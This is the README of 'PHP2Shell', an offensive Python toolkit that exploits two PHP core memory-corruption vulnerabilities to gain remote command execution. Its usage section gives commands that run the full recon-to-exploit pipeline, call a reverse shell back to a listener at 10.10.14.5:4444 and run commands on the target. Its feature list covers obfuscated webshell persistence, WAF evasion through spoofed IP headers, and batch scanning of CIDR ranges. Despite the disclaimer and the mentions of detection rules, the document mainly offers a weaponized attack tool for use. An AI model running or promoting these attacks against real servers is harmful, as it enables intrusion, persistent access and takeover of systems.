# 🔬 PHP2Shell — Research & Exploitation Toolkit (v2.2.0)

> [!CAUTION]
> ### ⚠️ LEGAL & ETHICAL DISCLAIMER — AUTHORIZED LABORATORY TESTING ONLY
> **This software is created strictly for authorized security research, vulnerability auditing, educational demonstration, and defensive hardening within isolated lab environments.**
> 
> Unauthorized testing, probing, or attacking of remote systems without explicit, prior written permission from the asset owners is illegal under national and international cybercrime legislation (including the US Computer Fraud and Abuse Act 18 U.S.C. § 1030, the UK Computer Misuse Act 1990, and equivalent statutes worldwide).
> 
> **The creators, contributors, and maintainers accept NO responsibility or liability** for any damage, service disruption, data loss, or legal consequences resulting from the misuse or deployment of this software. By cloning, downloading, viewing, or running this toolkit, you explicitly agree to use it exclusively on systems and networks you own or are legally authorized to test.

<p align="center">
  <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-109618"><img src="https://img.shields.io/badge/CVE--2026--109618-CRITICAL%20(9.2)-e74c3c?style=for-the-badge" alt="CVE-2026-109618"></a>
  <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-109619"><img src="https://img.shields.io/badge/CVE--2026--109619-CRITICAL%20(9.2)-e74c3c?style=for-the-badge" alt="CVE-2026-109619"></a>
  <a href="https://www.exploit-db.com/exploits/52704"><img src="https://img.shields.io/badge/EXPLOIT--DB-%2352704-e67e22?style=for-the-badge" alt="Exploit-DB #52704"></a>
</p>

<p align="center">
  <img src="https://img.shields.io/badge/PYTHON-3.9+-3776AB?style=for-the-badge&logo=python&logoColor=white" alt="Python">
  <a href="php2shell.py"><img src="https://img.shields.io/badge/TOOLKIT-V2.2.0-2ecc71?style=for-the-badge" alt="Toolkit"></a>
  <a href="LICENSE"><img src="https://img.shields.io/badge/LICENSE-MIT-3498db?style=for-the-badge" alt="License"></a>
</p>

<p align="center">
  <strong>Comprehensive research, defensive auditing, and unified exploitation suite for CVE-2026-109618 & CVE-2026-109619 — critical PHP core vulnerabilities.</strong><br>
  <em>Features an all-in-one script (<code>php2shell.py</code>) delivering an end-to-end pipeline: Recon → Passive Fingerprinting → Behavioral Probing → WAF Evasion → Weaponized Exploitation → Interactive Shell / Reverse Listener.</em>
</p>

---

## 📋 Vulnerability Overview

PHP2Shell provides discovery, differential analysis, and weaponized verification for two critical remote vulnerabilities in PHP's core memory allocator and multipart request parsing subsystems:

| CVE | Vulnerability Type | CVSS | Affected Branches | Fixed Releases |
|---|---|---|---|---|
| **CVE-2026-109618** | RFC 1867 OOM Uninitialized Memory Corruption | **9.2** Critical | PHP 5.4 – 8.2 (< 8.2.35), 8.3 (< 8.3.36), 8.4 (< 8.4.27), 8.5 (< 8.5.12) | **8.2.35, 8.3.36, 8.4.27, 8.5.12** |
| **CVE-2026-109619** | Stale Global State (`SG()` / `PG()`) Use-After-Free | **9.2** Critical | PHP 5.4 – 8.2 (< 8.2.35), 8.3 (< 8.3.36), 8.4 (< 8.4.27), 8.5 (< 8.5.12) | **8.2.35, 8.3.36, 8.4.27, 8.5.12** |

### ⛓️ Exploitation Chain Summary
1. **RFC 1867 OOM Bailout**: Deeply nested multipart arrays induce a memory allocation error triggering `zend_bailout()`, bypassing standard request cleanup.
2. **Worker State Poisoning (UAF)**: Persistent HTTP/1.1 Keep-Alive connections reuse the same worker process (`mod_php` or `PHP-FPM`), causing the subsequent request to dereference uninitialized or freed memory.
3. **Exploit-DB #52704 Chain**:
   - **Stage 0**: HTTP worker rotation (aborting current worker so prefork forks a clean child).
   - **Stage 1**: `Set-Cookie` heap leak yielding the Zend MM 2MB chunk base.
   - **Stage 2**: `Set-Cookie` 56-byte HashTable page leak disclosing the `libphp` base address (`ZVAL_PTR_DTOR`).
   - **Stage 3**: `PHP_SESSION_UPLOAD_PROGRESS` fake reference hijacking with `pDestructor` pointed to `zif_system` for arbitrary command execution.

---

## 🚀 Key Features

- ⚡ **All-In-One Unified Engine (`php2shell.py`)**:
  - Single executable script combining the entire kill-chain with zero duplicate logic.
  - Continuous execution: probes all discovered endpoints and continues through all stages without stopping mid-session.
  - Single-request optimization: `VersionChecker` and `HeaderAnalyzer` share one initial cached HTTP response with endpoint fallback.
  - Real-time timestamped progress reporting after each pipeline phase (`[1/5]` through `[5/5]` and `[Shell]`).
- 🔍 **Enhanced Pre-Scan Reconnaissance**:
  - Comprehensive built-in wordlist (120+ PHP paths covering uploads, CMSs, administration, database managers, and APIs).
  - Custom wordlist file support (`-w` / `--wordlist`).
  - Remote wordlist synchronization: directly fetch and merge the latest GitHub SecLists (`--remote-wordlist`).
  - `robots.txt` and `sitemap.xml` harvesting.
  - WAF detection (Cloudflare, AWS WAF, Akamai, ModSecurity, Imperva, F5 ASM, Sucuri, etc.).
  - CMS fingerprinting (WordPress, Drupal, Joomla, Magento, OpenCart, PrestaShop, Laravel, Symfony).
  - Subdomain enumeration via `crt.sh` Certificate Transparency logs.
- 🔬 **Passive Fingerprinting**:
  - Non-invasive version inspection from `X-Powered-By`, `Server`, `Set-Cookie` (`PHPSESSID`), and exposed `phpinfo()` files (`/phpinfo.php`, `/info.php`, `/php_info.php`, `/test.php`, `/i.php`).
  - Automated evaluation against official core patch thresholds and EOL status.
- 🧪 **Active Behavioral Differential Probing**:
  - Dispatches 62-level nested multipart arrays (512 KiB to 8 MiB) and upload-progress probes.
  - Auto-fails over across discovered endpoints if one endpoint returns 404 or connection error.
  - Identifies worker crashes, HTTP 500/502/503 status codes, and timing deltas without executing destructive code.
- 🛡️ **WAF Evasion & Diagnostic Analysis**:
  - Tests target responses to chunked `Transfer-Encoding`, unusual multipart boundary characters, and spoofed IP headers (`X-Forwarded-For`, `X-Real-IP`).
- 💥 **Automated Weaponized Exploitation**:
  - **Exploit-DB #52704**: Native binary leak and `zif_system` execution supporting both `bookworm` (`php:8.4.26-apache`) and `lab` builds.
  - **Webshell Persistence**: Automated obfuscated PHP webshell deployment across common writable directories with output delimiters.
  - **Multi-Endpoint Fallback**: Automatically retries webshell deployment across alternative discovered endpoints if the first fails.
- 💻 **Persistent Interactive Shell**:
  - Drops into a live pseudo-terminal (`www-data@target:/var/www/html$`) with directory tracking (`cd`).
  - **Ctrl+C Confirmation Guard**: Intercepts `KeyboardInterrupt` and prompts before exiting so sessions never drop accidentally.
- 📡 **Built-in Reverse Shell Listener**:
  - Native listener on `0.0.0.0:LPORT` with interactive two-way streaming.
  - Automatic re-listen and payload re-trigger options with operator confirmation (`y/N`).
- 🧪 **Standalone Lab (No Docker Required)**:
  - Built-in lightweight test server (`lab/standalone_lab.py`) serving fixtures from `lab/app/` to validate the toolkit locally.

---

## 📦 Installation & Setup

### ⚙️ Prerequisites
- Python 3.9 or higher
- `pip` package manager

```bash
# Clone the repository
git clone https://github.com/umair-aziz025/PHP2Shell.git
cd PHP2Shell

# Install required dependencies
pip install -r requirements.txt
```

---

## ⚡ Usage & Examples

The primary script ([`php2shell.py`](php2shell.py)) handles all tasks in one single file:

### 🚀 1. Full Pipeline Execution (Recon → Passive → Probes → WAF → Exploit)
```bash
python php2shell.py http://127.0.0.1:8899/ --all -v
```

### 🔍 2. Reconnaissance with Custom Wordlist or Remote SecLists
```bash
# Using a local custom wordlist
python php2shell.py http://target.lab:8088/ --recon -w my_wordlist.txt -v

# Fetching latest remote SecLists PHP filenames directly from GitHub
python php2shell.py http://target.lab:8088/ --recon --remote-wordlist -v
```

### 💻 3. Auto-Exploit and Drop Into Live Interactive Shell Console
```bash
python php2shell.py http://target.lab:8088/ --all --shell
```

### 📡 4. Built-in Interactive Reverse Shell Listener
```bash
python php2shell.py http://target.lab:8088/ --all --lhost 10.10.14.5 --lport 4444
```

### 🎯 5. Direct Exploit-DB #52704 Binary Leak Execution
```bash
python php2shell.py http://target.lab:8088/index.php \
  --exploit \
  --exploit-method binary \
  --exploit-profile bookworm \
  --cmd "id>/tmp/pwn" \
  --proof-file /tmp/pwn
```

### 📊 6. Multi-Target Batch Audit with Report Export
```bash
python php2shell.py -f targets.txt --threads 20 --recon --active --waf -o audit_report
```
*Generates both `audit_report.json` and `audit_report.md`.*

---

## 🧪 Testing with the Standalone Lab (No Docker Needed)

You can test the entire pipeline locally without installing Docker or a native PHP binary:

```bash
# 1. Start the standalone lab server in background (simulating PHP 8.4.26 mod_php)
python lab/standalone_lab.py --port 8899 --version 8.4.26

# 2. Run the unified scanner against the local lab
python php2shell.py http://127.0.0.1:8899/ --all -v
```

---

## 📖 CLI Reference: `php2shell.py`

| Flag | Category | Description |
|---|---|---|
| `targets` | Target | Target URL(s) or CIDR range (`192.168.1.0/24`) |
| `-f, --file FILE` | Target | File containing target URLs (one per line) |
| `-o, --output BASE` | Reporting | Base path for JSON and Markdown reports |
| `-t, --threads N` | Performance | Concurrent scan worker threads (default: `10`) |
| `--timeout SECS` | Network | Request timeout in seconds (default: `10`) |
| `-v, --verbose` | Logging | Enable detailed stage output and diagnostic logs |
| `--json` | Output | Output raw structured JSON to stdout |
| `--all, --full` | Pipeline | Run all 5 stages end-to-end (Recon → Passive → Probes → WAF → Exploit) |
| `--recon` | Stage 1 | Run endpoint discovery, CMS detection, WAF identification |
| `-w, --wordlist FILE` | Stage 1 | Path to custom endpoint wordlist file |
| `--remote-wordlist` | Stage 1 | Download and merge latest GitHub SecLists PHP filenames wordlist |
| `--max-endpoints N` | Stage 1 | Maximum endpoints to probe in recon (default: `150`) |
| `--subdomain-enum` | Stage 1 | Query `crt.sh` Certificate Transparency logs for subdomains |
| `--active` | Stage 3 | Run behavioral differential probes (62-level nested array & UAF) |
| `--waf` | Stage 4 | Run WAF evasion diagnostics (chunked encoding, boundary, IP spoof) |
| `--exploit, --auto-shell` | Stage 5 | Run weaponized exploitation chain |
| `--shell` | Stage 6 | Drop into persistent interactive shell session upon successful exploitation |
| `--cmd COMMAND` | Exploit | Initial command to execute (default: `id; whoami; uname -a`) |
| `--webshell-name NAME` | Exploit | Custom filename for dropped webshell (default: `p2s_shell.php`) |
| `--exploit-method` | Exploit | Method selection: `auto` (default), `binary` (52704), or `upload` |
| `--exploit-profile` | Exploit | Target build profile: `bookworm` (default) or `lab` |
| `--zif-offset OFFSET` | Exploit | Custom hexadecimal offset for `zif_system` in `libphp.so` |
| `--dtor-offset OFFSET` | Exploit | Custom hexadecimal offset for `zval_ptr_dtor` |
| `--htdata-offset OFFSET` | Exploit | Custom offset for the 167-byte fake HashTable carrier |
| `--proof-file PATH` | Exploit | Local file path to read and verify execution proof |
| `--fetch PATH` | Exploit | Remote path to fetch via GET to verify execution proof |
| `--huge-mb MB` | Exploit | Memory allocation in MB to trigger OOM (default: `12`) |
| `--lhost IP` | Reverse Shell | Listener IP address for reverse shell callback |
| `--lport PORT` | Reverse Shell | Listener port for reverse shell callback (default: `4444`) |
| `--reverse` | Reverse Shell | Trigger automatic reverse shell dispatch |

---

## 📁 Repository Structure

```
PHP2Shell/
│
├── php2shell.py                       # ⚡ Single monolithic scan-to-shell script (Zero duplicates)
├── requirements.txt                   # Python package dependencies
├── setup.py                           # Package installation configuration
├── README.md                          # Main documentation & safety guidelines
│
├── detection/                         # Defensive detection & monitoring rules
│   ├── README.md                      # Detection deployment guide
│   ├── sigma/                         # Sigma rules for SIEM event logs
│   ├── snort/                         # Snort NIDS signatures
│   ├── suricata/                      # Suricata IDS/IPS rules
│   └── yara/                          # YARA file & memory scanner rules
│
├── lab/                               # Test environments
│   ├── standalone_lab.py              # 🧪 Lightweight Python lab server (No Docker needed)
│   ├── docker-compose.yml             # Dockerized multi-version test environment
│   ├── LAB_SETUP.md                   # Comprehensive lab documentation
│   └── app/                           # Test application fixtures
│       ├── index.php                  # Primary test endpoint
│       └── phpinfo.php                # Fingerprinting fixture
│
├── advisory/
│   └── TECHNICAL_ADVISORY.md          # Technical root cause analysis & CVSS breakdown
│
└── remediation/
    └── REMEDIATION_GUIDE.md           # Distribution-specific patching & mitigation guide
```

---

## 🔬 Threat Intelligence & Reference Verification

The techniques and detection logic in this toolkit have been validated against vendor advisories and research publications:

- **Exploit-DB #52704**: [php2shell - one-click remote exploit for PHP 8.4.26 / mod_php, prefork](https://www.exploit-db.com/exploits/52704) (9bie & Exploit-DB)
- **PHP Project Advisories**:
  - [GHSA-6wmf-4rv5-p3rp](https://github.com/php/php-src/security/advisories/GHSA-6wmf-4rv5-p3rp) (CVE-2026-109618 RFC 1867 OOM Bailout)
  - [GHSA-w8hw-w9fx-j79w](https://github.com/php/php-src/security/advisories/GHSA-w8hw-w9fx-j79w) (CVE-2026-109619 Stale Global State UAF)
- **Calif.io Deep Dive**: [PHP2Shell: Under the Hood of PHP Core Memory Corruption](https://calif.io/php2shell/#php-5-4-0-rce)
- **Datadog Security Labs**: [PHP2Shell Critical Vulnerabilities in PHP](https://securitylabs.datadoghq.com/articles/php2shell-critical-vulnerabilities-in-php/)
- **CrowdStrike Falcon**: [CrowdStrike Protects Customers from PHP RCE Zero-Days](https://www.crowdstrike.com/en-us/blog/crowdstrike-protects-customers-from-php-rce-zero-days/)
- **Wiz.io Threat Intel**: [PHP2Shell Cloud Threat Analysis](https://www.wiz.io/blog/php2shell-php-rce)

---

## 📄 License

This project is licensed under the **MIT License** — see the [LICENSE](LICENSE) file for details.
